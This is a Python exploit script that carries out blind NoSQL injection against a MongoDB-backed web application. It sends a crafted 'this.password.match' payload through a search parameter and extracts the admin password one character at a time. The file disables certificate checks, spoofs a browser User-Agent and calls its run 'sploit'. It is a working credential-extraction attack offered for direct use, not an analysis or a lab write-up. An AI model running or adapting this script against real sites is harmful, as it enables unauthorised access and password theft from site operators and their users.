#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# mongo_passwordMatch_exfil.py
# lord[at]vadersecurity.com

# import --
import re
import sys
import string
import requests

# surpress https warnings --
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# globals --
""" initialize globals / increment --  """
test = ""


# definitions --
def url_Injection(Url, my_Char):
    """ send request to target -- """
    """ inject url with updated data -- """
    """ update url if needed here -- """
    Get = "/?search=admin'+%26%26+this.password.match(/^{}/)%00".format(
        my_Char)
    Req = "".join([Url, Get])
    print("(*) Sending request: {}".format(Req))

    # send req --
    headers = ({
        'User-Agent':
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0'
    })

    rs = requests.Session()
    r = rs.get(Req, headers=headers, allow_redirects=False, verify=False)

    # parse resp --
    match = re.search('>admin<', r.text)
    if match:
        return my_Char


def the_Iterator():
    """ charset test / a-z0-9; Burp intruder /^5/ returns true  -- """
    """ update global password injection data -- """
    global test
    my_charset = list(string.printable)
    while 1:
        for my_Char in my_charset:
            """ update var and append new charset at break -- """
            """ need to fix clean exit -- """
            """ screw it for now; it works -- """
            my_Char = test + my_Char
            resp = url_Injection(Url, my_Char)
            if resp is None:
                pass
            elif my_Char == my_charset[-1]:
                print('[+] Password: {}'.format(test))
                print('[+] Exiting --')
                sys.exit()
            else:
                """ update global var -- """
                print('[+] Updated: {}'.format(resp))
                test = resp
                break


# main --
if __name__ == '__main__':
    try:
        Url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s Url" % sys.argv[0])
        print('(+) eg: %s https://target.com' % sys.argv[0])
        sys.exit()

# start sploit --
the_Iterator()

# __EOF__
